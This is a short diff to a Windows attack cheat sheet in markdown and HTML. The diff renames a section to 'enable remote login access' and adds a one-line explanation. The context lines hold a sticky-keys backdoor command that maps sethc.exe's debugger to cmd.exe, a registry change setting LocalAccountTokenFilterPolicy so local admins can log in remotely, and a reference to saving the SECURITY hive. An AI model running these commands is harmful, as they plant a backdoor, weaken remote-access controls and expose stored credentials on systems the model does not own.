@@ -55,7 +55,9 @@ shift backdoor
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
-## enable uac policy
+## enable remote login access
+
+for domains, because of uac policy
 
 ```
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
@@ -99,7 +101,9 @@ reg save hklm\security security.hive
 <pre><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 </code></pre>
 
-<h2 id="enableuacpolicy">enable uac policy</h2>
+<h2 id="enableremoteloginaccess">enable remote login access</h2>
+
+<p>for domains, because of uac policy</p>
 
 <pre><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 </code></pre>
